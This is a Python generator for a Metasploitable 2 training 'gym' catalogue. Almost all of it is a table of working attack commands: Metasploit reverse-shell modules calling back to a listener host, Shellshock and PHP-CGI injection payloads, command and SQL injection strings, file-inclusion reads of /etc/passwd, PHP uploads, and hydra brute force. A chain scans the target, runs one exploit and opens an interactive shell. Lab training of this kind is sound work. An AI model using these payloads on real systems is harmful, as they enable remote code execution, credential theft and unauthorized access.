"""Generate the Metasploitable 2 gym catalogue.

The generated YAML is the runtime source of truth: one exploit file per
vector, one chain per vulnerability and one index playbook. This tool
keeps the matrix consistent when a new lab vector is added.
"""

from __future__ import annotations

from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent.parent
EXPLOITS = ROOT / "exploits"
CHAINS = ROOT / "chains"
PLAYBOOKS = ROOT / "playbooks"

BASE_CHAIN = "gym_metasploitable_chain"
DVWA_LOGIN = (
    "curl -s -c /tmp/ms2_dvwa_{rhost}.cookie "
    "-d 'username=1337&password=charley&Login=Login' "
    "http://{rhost}/dvwa/login.php >/dev/null; "
    "curl -s -b /tmp/ms2_dvwa_{rhost}.cookie -c /tmp/ms2_dvwa_{rhost}.cookie "
    "-d 'security=low&seclev_submit=Submit' "
    "http://{rhost}/dvwa/security.php >/dev/null"
)
DVWA_LOGIN_PREFIX = (
    "curl -s -c /tmp/ms2_dvwa_{rhost}.cookie "
    "-d 'username=admin&password=password&Login=Login' "
    "http://{rhost}/dvwa/login.php >/dev/null; "
)
DVWA_CSRF_LOGIN = (
    "curl -s -c /tmp/ms2_dvwa_{rhost}.cookie "
    "-d 'username=gordonb&password=abc123&Login=Login' "
    "http://{rhost}/dvwa/login.php >/dev/null; "
    "curl -s -b /tmp/ms2_dvwa_{rhost}.cookie -c /tmp/ms2_dvwa_{rhost}.cookie "
    "-d 'security=low&seclev_submit=Submit' "
    "http://{rhost}/dvwa/security.php >/dev/null"
)

VULNERABILITIES = [
    {
        "id": "vsftpd_backdoor",
        "name": "vsftpd 2.3.4 backdoor",
        "cve": "CVE-2011-2523",
        "mitre": "T1190",
        "port": "21",
        "service": "ftp",
        "products": ["vsftpd"],
        "severity": "critical",
        "confidence": 0.9,
        "commands": [],
        "shell_indicators": ["uid="],
        "exists": True,
    },
    {
        "id": "samba_usermap",
        "name": "Samba username map script RCE",
        "cve": "CVE-2007-2447",
        "mitre": "T1210",
        "port": "445",
        "service": "smb",
        "products": ["samba"],
        "severity": "critical",
        "confidence": 0.55,
        "commands": [],
        "shell_indicators": ["uid="],
        "exists": True,
    },
    {
        "id": "ms2_ssh_default_creds",
        "name": "OpenSSH default msfadmin credentials",
        "cve": "",
        "mitre": "T1110.001",
        "port": "22",
        "service": "ssh",
        "products": ["openssh"],
        "severity": "high",
        "confidence": 0.7,
        "commands": [
            {
                "run": "timeout 20 sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null msfadmin@{rhost} 'id'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uid="],
        "requires": ["sshpass", "ssh"],
    },
    {
        "id": "ms2_telnet_default_creds",
        "name": "Telnet default msfadmin credentials",
        "cve": "",
        "mitre": "T1078",
        "port": "23",
        "service": "telnet",
        "products": [],
        "severity": "high",
        "confidence": 0.6,
        "commands": [
            {
                "run": "printf 'msfadmin\\nmsfadmin\\nid\\nexit\\n' | timeout 20 telnet {rhost} 23",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uid="],
        "requires": ["telnet"],
    },
    {
        "id": "ms2_smtp_user_enum",
        "name": "Postfix VRFY user enumeration",
        "cve": "",
        "mitre": "T1087",
        "port": "25",
        "service": "smtp",
        "products": ["postfix"],
        "severity": "medium",
        "confidence": 0.5,
        "commands": [
            {
                "run": "printf 'VRFY root\\nVRFY msfadmin\\nQUIT\\n' | timeout 20 nc -w 10 {rhost} 25",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["250", "252"],
        "requires": ["nc"],
    },
    {
        "id": "ms2_dns_recursion",
        "name": "BIND open recursion",
        "cve": "",
        "mitre": "T1590.002",
        "port": "53",
        "service": "domain",
        "products": ["bind"],
        "severity": "medium",
        "confidence": 0.4,
        "commands": [
            {
                "run": "dig @{rhost} example.com +short",
                "timeout": 20,
            }
        ],
        "shell_indicators": ["ANSWER SECTION"],
        "requires": ["dig"],
    },
    {
        "id": "ms2_phpmyadmin_default",
        "name": "phpMyAdmin default root login",
        "cve": "",
        "mitre": "T1078",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s -o /dev/null -w '%{http_code}' http://{rhost}/phpMyAdmin/",
                "timeout": 20,
            },
            {
                "run": "curl -s -c /tmp/ms2_pma_{rhost}.cookie -d 'pma_username=root&pma_password=&server=1' http://{rhost}/phpMyAdmin/index.php | head -40",
                "timeout": 20,
            },
        ],
        "shell_indicators": ["phpMyAdmin", "localhost"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_command_injection",
        "name": "DVWA command injection",
        "cve": "",
        "mitre": "T1059.004",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s -c /tmp/ms2_dvwa_{rhost}.cookie -d 'username=admin&password=password&Login=Login' http://{rhost}/dvwa/login.php >/dev/null; curl -s -b /tmp/ms2_dvwa_{rhost}.cookie 'http://{rhost}/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit' | head -60",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uid="],
        "requires": ["curl"],
    },
    {
        "id": "ms2_mutillidae_sqli",
        "name": "Mutillidae SQL injection",
        "cve": "",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.4,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}/mutillidae/index.php?page=user-info.php&username=%27%20OR%201%3D1--%20-&password=&user-info-php-submit-button=View+Account+Details' | head -80",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["User", "Password"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_nfs_exports",
        "name": "NFS world-readable export",
        "cve": "",
        "mitre": "T1083",
        "port": "2049",
        "service": "nfs",
        "products": [],
        "severity": "high",
        "confidence": 0.5,
        "commands": [
            {
                "run": "showmount -e {rhost}",
                "timeout": 20,
            }
        ],
        "shell_indicators": ["/"],
        "requires": ["showmount"],
    },
    {
        "id": "ms2_rlogin_trust",
        "name": "rlogin trusted host access",
        "cve": "",
        "mitre": "T1078",
        "port": "513",
        "service": "login",
        "products": [],
        "severity": "high",
        "confidence": 0.4,
        "commands": [
            {
                "run": "timeout 20 rlogin -l root {rhost}",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uid=", "#"],
        "requires": ["rlogin"],
    },
    {
        "id": "ms2_java_rmi",
        "name": "Java RMI server RCE",
        "cve": "CVE-2011-3556",
        "mitre": "T1210",
        "port": "1099",
        "service": "java-rmi",
        "products": [],
        "severity": "critical",
        "confidence": 0.5,
        "commands": [
            {
                "run": "timeout 120 msfconsole -q -x 'use exploit/multi/misc/java_rmi_server; set RHOSTS {rhost}; set RPORT 1099; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run; exit'",
                "timeout": 150,
            }
        ],
        "shell_indicators": ["meterpreter", "session opened"],
        "requires": ["msfconsole"],
    },
    {
        "id": "ms2_ingreslock",
        "name": "Ingreslock bind shell",
        "cve": "",
        "mitre": "T1021",
        "port": "1524",
        "service": "ingreslock",
        "products": [],
        "severity": "critical",
        "confidence": 0.9,
        "commands": [
            {
                "run": "printf 'id\\n' | timeout 10 nc {rhost} 1524",
                "timeout": 20,
            }
        ],
        "shell_indicators": ["uid="],
        "requires": ["nc"],
        "exec": {"trigger": "true", "shell_port": 1524, "probe": "id", "timeout": 20},
    },
    {
        "id": "ms2_mysql_root",
        "name": "MySQL root without password",
        "cve": "",
        "mitre": "T1078",
        "port": "3306",
        "service": "mysql",
        "products": ["mysql"],
        "severity": "critical",
        "confidence": 0.7,
        "commands": [
            {
                "run": "timeout 20 mysql -h {rhost} -u root --batch -e 'SELECT user,host FROM mysql.user;'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["mysql.user", "root"],
        "requires": ["mysql"],
    },
    {
        "id": "ms2_postgres_default",
        "name": "PostgreSQL default postgres credentials",
        "cve": "",
        "mitre": "T1078",
        "port": "5432",
        "service": "postgresql",
        "products": ["postgresql"],
        "severity": "high",
        "confidence": 0.6,
        "commands": [
            {
                "run": "PGPASSWORD=postgres timeout 20 psql -h {rhost} -U postgres -c 'SELECT version();'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["PostgreSQL"],
        "requires": ["psql"],
    },
    {
        "id": "ms2_vnc_password",
        "name": "VNC weak password",
        "cve": "",
        "mitre": "T1110.001",
        "port": "5900",
        "service": "vnc",
        "products": [],
        "severity": "high",
        "confidence": 0.5,
        "commands": [
            {
                "run": "timeout 30 nmap -p 5900 --script vnc-brute --script-args passdb=/usr/share/wordlists/rockyou.txt {rhost}",
                "timeout": 60,
            }
        ],
        "shell_indicators": ["password", "VNC"],
        "requires": ["nmap"],
    },
    {
        "id": "ms2_x11_open",
        "name": "Open X11 display",
        "cve": "",
        "mitre": "T1021",
        "port": "6000",
        "service": "x11",
        "products": [],
        "severity": "medium",
        "confidence": 0.6,
        "commands": [
            {
                "run": "timeout 20 xdpyinfo -display {rhost}:0",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["number of extensions", "vendor string"],
        "requires": ["xdpyinfo"],
    },
    {
        "id": "ms2_unrealircd_backdoor",
        "name": "UnrealIRCd 3.2.8.1 backdoor",
        "cve": "CVE-2010-2075",
        "mitre": "T1190",
        "port": "6667",
        "service": "irc",
        "products": ["unrealircd"],
        "severity": "critical",
        "confidence": 0.6,
        "commands": [
            {
                "run": "timeout 120 msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {rhost}; set RPORT 6667; set PAYLOAD cmd/unix/reverse; set LHOST {lhost}; set LPORT {lport}; run; exit'",
                "timeout": 150,
            }
        ],
        "shell_indicators": ["Command shell session", "session opened"],
        "requires": ["msfconsole"],
    },
    {
        "id": "ms2_tomcat_manager",
        "name": "Tomcat Manager default credentials",
        "cve": "",
        "mitre": "T1078",
        "port": "8180",
        "service": "http",
        "products": ["tomcat"],
        "severity": "critical",
        "confidence": 0.5,
        "commands": [
            {
                "run": "timeout 120 msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {rhost}; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run; exit'",
                "timeout": 150,
            }
        ],
        "shell_indicators": ["meterpreter", "session opened"],
        "requires": ["msfconsole"],
    },
    {
        "id": "ms2_distcc_exec",
        "name": "DistCC daemon command execution",
        "cve": "CVE-2004-2687",
        "mitre": "T1210",
        "port": "3632",
        "service": "distcc",
        "products": ["distcc"],
        "severity": "critical",
        "confidence": 0.6,
        "commands": [
            {
                "run": "timeout 120 msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS {rhost}; set RPORT 3632; set PAYLOAD cmd/unix/reverse; set LHOST {lhost}; set LPORT {lport}; run; exit'",
                "timeout": 150,
            }
        ],
        "shell_indicators": ["Command shell session", "session opened"],
        "requires": ["msfconsole"],
    },
    {
        "id": "ms2_proftpd_anon",
        "name": "ProFTPD anonymous access",
        "cve": "",
        "mitre": "T1078",
        "port": "2121",
        "service": "ftp",
        "products": ["proftpd"],
        "severity": "medium",
        "confidence": 0.5,
        "commands": [
            {
                "run": "printf 'USER anonymous\\nPASS anonymous\\nLIST\\nQUIT\\n' | timeout 20 nc {rhost} 2121",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["drwx", "226"],
        "requires": ["nc"],
    },
    {
        "id": "ms2_webdav",
        "name": "Apache WebDAV enabled",
        "cve": "",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.4,
        "commands": [
            {
                "run": "curl -s -i -X OPTIONS http://{rhost}/ | head -30",
                "timeout": 20,
            },
            {
                "run": "curl -s -i -X PROPFIND http://{rhost}/ -H 'Depth: 1' | head -40",
                "timeout": 20,
            },
        ],
        "shell_indicators": ["DAV:", "200 OK"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_shellshock",
        "name": "Bash Shellshock via CGI",
        "cve": "CVE-2014-6271",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "critical",
        "confidence": 0.4,
        "commands": [
            {
                "run": "curl -s -H 'User-Agent: () { :;}; echo; /bin/id' http://{rhost}/cgi-bin/status",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uid="],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_sqli",
        "name": "DVWA SQL injection",
        "cve": "",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s -c /tmp/ms2_dvwa_{rhost}.cookie -d 'username=admin&password=password&Login=Login' http://{rhost}/dvwa/login.php >/dev/null; curl -s -b /tmp/ms2_dvwa_{rhost}.cookie 'http://{rhost}/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit' | head -80",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["First name", "Surname"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_sqli_blind",
        "name": "DVWA blind SQL injection",
        "cve": "",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.4,
        "commands": [
            {
                "run": "COOKIE=$(awk '/PHPSESSID/{print $7}' /tmp/ms2_dvwa_{rhost}.cookie); timeout 120 sqlmap -u 'http://{rhost}/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit' --cookie=\"security=low; PHPSESSID=$COOKIE\" --batch --technique=T --level=1 --risk=1",
                "timeout": 150,
            }
        ],
        "shell_indicators": ["is vulnerable", "Type: time-based"],
        "requires": ["sqlmap"],
    },
    {
        "id": "ms2_dvwa_xss_reflected",
        "name": "DVWA reflected XSS",
        "cve": "",
        "mitre": "T1059.007",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.6,
        "commands": [
            {
                "run": "curl -s -b /tmp/ms2_dvwa_{rhost}.cookie 'http://{rhost}/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E' | grep -m1 'alert(1)'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["<script>alert(1)</script>"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_xss_stored",
        "name": "DVWA stored XSS",
        "cve": "",
        "mitre": "T1059.007",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.6,
        "commands": [
            {
                "run": "curl -s -c /tmp/ms2_dvwa_{rhost}.cookie -d 'username=admin&password=password&Login=Login' http://{rhost}/dvwa/login.php >/dev/null; curl -s -b /tmp/ms2_dvwa_{rhost}.cookie -d 'txtName=%3Cscript%3Ealert(1)%3C%2Fscript%3E&mtxMessage=ms2&btnSign=Sign+Guestbook' http://{rhost}/dvwa/vulnerabilities/xss_s/ >/dev/null; curl -s -b /tmp/ms2_dvwa_{rhost}.cookie http://{rhost}/dvwa/vulnerabilities/xss_s/ | grep -m1 'alert(1)'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["<script>alert(1)</script>"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_xss_dom",
        "name": "DVWA DOM XSS",
        "cve": "",
        "mitre": "T1059.007",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s -b /tmp/ms2_dvwa_{rhost}.cookie 'http://{rhost}/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C%2Fscript%3E' | grep -m1 'alert(1)'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["<script>", "default="],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_csrf",
        "name": "DVWA CSRF password change",
        "cve": "",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s -b /tmp/ms2_dvwa_{rhost}.cookie 'http://{rhost}/dvwa/vulnerabilities/csrf/?password_new=ms2pass&password_conf=ms2pass&Change=Change' | head -60; curl -s -b /tmp/ms2_dvwa_{rhost}.cookie 'http://{rhost}/dvwa/vulnerabilities/csrf/?password_new=abc123&password_conf=abc123&Change=Change' >/dev/null",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["Password Changed", "Password changed"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_lfi",
        "name": "DVWA local file inclusion",
        "cve": "",
        "mitre": "T1005",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.6,
        "commands": [
            {
                "run": "curl -s -c /tmp/ms2_dvwa_{rhost}.cookie -d 'username=admin&password=password&Login=Login' http://{rhost}/dvwa/login.php >/dev/null; curl -s -b /tmp/ms2_dvwa_{rhost}.cookie 'http://{rhost}/dvwa/vulnerabilities/fi/?page=/etc/passwd' | head -80",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["root:x:0:0"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_file_upload",
        "name": "DVWA unrestricted file upload",
        "cve": "",
        "mitre": "T1105",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.5,
        "commands": [
            {
                "run": "printf \"<?php echo 'ms2-upload'; ?>\" > /tmp/ms2_shell.php; curl -s -b /tmp/ms2_dvwa_{rhost}.cookie -F 'uploaded=@/tmp/ms2_shell.php;filename=ms2_shell.php' -F 'Upload=Upload' http://{rhost}/dvwa/vulnerabilities/upload/ | head -80",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uploaded", "success"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_dvwa_brute_force",
        "name": "DVWA login brute force",
        "cve": "",
        "mitre": "T1110.001",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.5,
        "commands": [
            {
                "run": "timeout 120 hydra -l admin -P /usr/share/wordlists/rockyou.txt {rhost} http-post-form '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed' -t 4",
                "timeout": 150,
            }
        ],
        "shell_indicators": ["login:", "password:"],
        "requires": ["hydra"],
    },
    {
        "id": "ms2_mutillidae_xss",
        "name": "Mutillidae reflected XSS",
        "cve": "",
        "mitre": "T1059.007",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}/mutillidae/index.php?page=user-info.php&username=%3Cscript%3Ealert(1)%3C%2Fscript%3E&password=ms2&user-info-php-submit-button=View+Account+Details' | grep -m1 'alert(1)'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["<script>alert(1)</script>"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_mutillidae_lfi",
        "name": "Mutillidae local file inclusion",
        "cve": "",
        "mitre": "T1005",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}/mutillidae/index.php?page=/etc/passwd' | grep -m1 'root:x'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["root:x:0:0"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_mutillidae_rfi",
        "name": "Mutillidae remote file inclusion",
        "cve": "",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.3,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}/mutillidae/index.php?page=http%3A%2F%2F127.0.0.1%3A8000%2Fms2_rfi.txt' | head -80",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["failed to open stream", "allow_url_include"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_mutillidae_command_injection",
        "name": "Mutillidae command injection",
        "cve": "",
        "mitre": "T1059.004",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}/mutillidae/index.php?page=dns-lookup.php&target_host=127.0.0.1%3Bid&dns-lookup-php-submit-button=Lookup+DNS' | head -100",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uid="],
        "requires": ["curl"],
    },
    {
        "id": "ms2_mutillidae_csrf",
        "name": "Mutillidae CSRF blog entry",
        "cve": "",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.3,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}/mutillidae/index.php?page=add-to-your-blog.php&blog_entry=ms2-csrf&add-to-your-blog-php-submit-button=Save+Blog+Entry' | head -100",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["Blog entry", "ms2-csrf"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_php_cgi_arg_injection",
        "name": "PHP-CGI argument injection",
        "cve": "CVE-2012-1823",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "critical",
        "confidence": 0.4,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}/cgi-bin/php?-d+allow_url_include%3don+-d+safe_mode%3doff+-d+suhosin.simulation%3don+-d+disable_functions%3d+-d+open_basedir%3dnone+-d+auto_prepend_file%3dphp://input' --data \"<?php echo shell_exec('id'); ?>\" | head -60",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uid="],
        "requires": ["curl"],
    },
    {
        "id": "ms2_twiki_xss",
        "name": "TWiki reflected XSS",
        "cve": "",
        "mitre": "T1059.007",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.3,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}/twiki/bin/view/Main/WebHome?topic=%3Cscript%3Ealert(1)%3C%2Fscript%3E' | grep -m1 'alert(1)'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["<script>alert(1)</script>"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_axis2_default",
        "name": "Apache Axis2 default services",
        "cve": "",
        "mitre": "T1190",
        "port": "8080",
        "service": "http",
        "products": ["apache"],
        "severity": "medium",
        "confidence": 0.4,
        "commands": [
            {
                "run": "curl -s 'http://{rhost}:8080/axis2/services/listServices' | head -100",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["Available services", "Version"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_webdav_put",
        "name": "Apache WebDAV PUT",
        "cve": "",
        "mitre": "T1105",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "high",
        "confidence": 0.4,
        "commands": [
            {
                "run": "curl -s -X PUT -d \"<?php echo 'ms2-webdav'; ?>\" 'http://{rhost}/dav/ms2.php'; curl -s 'http://{rhost}/dav/ms2.php'",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["ms2-webdav"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_apache_trace",
        "name": "Apache TRACE enabled",
        "cve": "",
        "mitre": "T1190",
        "port": "80",
        "service": "http",
        "products": ["apache"],
        "severity": "low",
        "confidence": 0.5,
        "commands": [
            {
                "run": "curl -s -X TRACE -H 'Cookie: ms2=1' 'http://{rhost}/' | head -40",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["TRACE /"],
        "requires": ["curl"],
    },
    {
        "id": "ms2_smtp_open_relay",
        "name": "Postfix open relay",
        "cve": "",
        "mitre": "T1071.003",
        "port": "25",
        "service": "smtp",
        "products": ["postfix"],
        "severity": "medium",
        "confidence": 0.3,
        "commands": [
            {
                "run": "printf 'EHLO ms2\nMAIL FROM:<a@ms2.local>\nRCPT TO:<root@localhost>\nDATA\nSubject: ms2\n\nrelay\n.\nQUIT\n' | timeout 20 nc -w 10 {rhost} 25",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["354", "250"],
        "requires": ["nc"],
    },
    {
        "id": "ms2_mysql_file_read",
        "name": "MySQL root file read",
        "cve": "",
        "mitre": "T1005",
        "port": "3306",
        "service": "mysql",
        "products": ["mysql"],
        "severity": "high",
        "confidence": 0.6,
        "commands": [
            {
                "run": "timeout 20 mysql -h {rhost} -u root --batch -e \"SELECT LOAD_FILE('/etc/passwd');\"",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["root:x:0:0"],
        "requires": ["mysql"],
    },
    {
        "id": "ms2_rsh_trust",
        "name": "rsh trusted host access",
        "cve": "",
        "mitre": "T1021",
        "port": "514",
        "service": "shell",
        "products": [],
        "severity": "high",
        "confidence": 0.3,
        "commands": [
            {
                "run": "timeout 20 rsh -l root {rhost} id",
                "timeout": 30,
            }
        ],
        "shell_indicators": ["uid="],
        "requires": ["rsh"],
    },
    {
        "id": "ms2_vnc_info",
        "name": "VNC authentication exposure",
        "cve": "",
        "mitre": "T1021.005",
        "port": "5900",
        "service": "vnc",
        "products": [],
        "severity": "medium",
        "confidence": 0.4,
        "commands": [
            {
                "run": "timeout 30 nmap -p 5900 --script vnc-info {rhost}",
                "timeout": 60,
            }
        ],
        "shell_indicators": ["VNC", "Authentication"],
        "requires": ["nmap"],
    },
]


def exploit_document(item: dict) -> dict:
    """Build one exploit YAML document."""
    doc = {
        "id": item["id"],
        "mitre_id": item["mitre"],
        "cve": item["cve"],
        "title": item["name"],
        "severity": item["severity"],
        "confidence": item["confidence"],
        "platforms": ["linux"],
        "services": [item["service"]],
        "products": list(item["products"]),
        "versions": [],
        "requires_binaries": list(item.get("requires", [])),
        "commands": list(item["commands"]),
        "shell_indicators": list(item["shell_indicators"]),
        "enabled": True,
    }
    if item.get("exec"):
        doc["exec"] = dict(item["exec"])
    return doc


def chain_document(item: dict) -> dict:
    """Build one per-vulnerability chain."""
    slug = item["id"]
    return {
        "name": f"gym_metasploitable_{slug}",
        "version": 2,
        "description": f"Metasploitable 2: {item['name']} ({item['cve'] or item['mitre']}).",
        "enabled": True,
        "extends": BASE_CHAIN,
        "tags": ["gym", "metasploitable2", item["service"]],
        "platforms": ["linux"],
        "defaults": {
            "exploit": item["id"],
            "vuln": slug,
            "port": item["port"],
        },
    }


def base_chain_document() -> dict:
    """Build the shared gym chain with scrape, exploit and sync stages."""
    return {
        "name": BASE_CHAIN,
        "version": 2,
        "description": "Metasploitable 2 gym base chain: bind target, scan once, run one exploit, sync surfaces.",
        "enabled": True,
        "tags": ["gym", "metasploitable2"],
        "platforms": ["linux"],
        "defaults": {
            "lhost": "127.0.0.1",
            "lport": "4444",
            "port": "80",
            "exploit": "",
            "vuln": "",
        },
        "steps": [
            {
                "id": "scope",
                "phase": "recon",
                "description": "Bind the gym target.",
                "run": "assign target {target}",
            },
            {
                "id": "scan",
                "phase": "recon",
                "description": "Scan once and reuse the XML on later runs.",
                "run": "lazynmap {target}",
                "skip_if_exists": "sessions/scan_{target}.nmap.xml",
                "timeout": 900,
            },
            {
                "id": "exploit",
                "phase": "exploit",
                "description": "Run the selected YAML exploit and fan the outcome out.",
                "run": "python3 modules/atomic_exploit_bridge.py run --id {exploit} --rhost {target} --lhost {lhost} --lport {lport} --port {port} --feed",
                "timeout": 180,
                "continue_on_error": False,
                "sinks": [
                    "world_model",
                    "killchain",
                    "intel_graph",
                    "attack_graph",
                    "c2_surfaces",
                    "objectives",
                    "report",
                ],
            },
            {
                "id": "sync",
                "phase": "report",
                "description": "Mirror the loop graphs into world model and objectives.",
                "run": "lazy_sync",
                "continue_on_error": True,
            },
            {
                "id": "session",
                "phase": "report",
                "description": "Refresh the C2 session report.",
                "run": "create_session_json",
                "continue_on_error": True,
            },
            {
                "id": "shell",
                "phase": "post",
                "description": "Open the interactive shell through the persistent exec-capable exploit.",
                "run": "atomic_shell --interactive {target}",
                "continue_on_error": True,
            },
        ],
    }


def index_document() -> dict:
    """Build the gym index consumed by the loader and the operator."""
    entries = []
    for item in VULNERABILITIES:
        entries.append(
            {
                "id": item["id"],
                "name": item["name"],
                "cve": item["cve"],
                "mitre": item["mitre"],
                "port": item["port"],
                "service": item["service"],
                "severity": item["severity"],
                "confidence": item["confidence"],
                "exploit": item["id"],
                "chain": f"gym_metasploitable_{item['id']}",
            }
        )
    return {
        "name": "gym_metasploitable",
        "version": 1,
        "target": "Metasploitable 2",
        "description": "One exploit, one chain and one index entry per Metasploitable 2 vector.",
        "vulnerabilities": entries,
    }


def _normalize_dvwa() -> None:
    """Prepend the low-security login and drop duplicated login prefixes."""
    VULNERABILITIES[:] = [item for item in VULNERABILITIES if item["id"] != "ms2_axis2_default"]
    for item in VULNERABILITIES:
        if not item["id"].startswith("ms2_dvwa_"):
            continue
        for command in item["commands"]:
            if command["run"].startswith(DVWA_LOGIN_PREFIX):
                command["run"] = command["run"][len(DVWA_LOGIN_PREFIX):]
        login = DVWA_CSRF_LOGIN if item["id"] == "ms2_dvwa_csrf" else DVWA_LOGIN
        item["commands"].insert(0, {"run": login, "timeout": 30})


def write() -> None:
    """Write every generated YAML file."""
    _normalize_dvwa()
    EXPLOITS.mkdir(parents=True, exist_ok=True)
    CHAINS.mkdir(parents=True, exist_ok=True)
    PLAYBOOKS.mkdir(parents=True, exist_ok=True)
    for item in VULNERABILITIES:
        if not item.get("exists"):
            (EXPLOITS / f"{item['id']}.yaml").write_text(
                yaml.safe_dump(exploit_document(item), sort_keys=False, allow_unicode=True),
                encoding="utf-8",
            )
        (CHAINS / f"gym_metasploitable_{item['id']}.yaml").write_text(
            yaml.safe_dump(chain_document(item), sort_keys=False, allow_unicode=True),
            encoding="utf-8",
        )
    (CHAINS / f"{BASE_CHAIN}.yaml").write_text(
        yaml.safe_dump(base_chain_document(), sort_keys=False, allow_unicode=True),
        encoding="utf-8",
    )
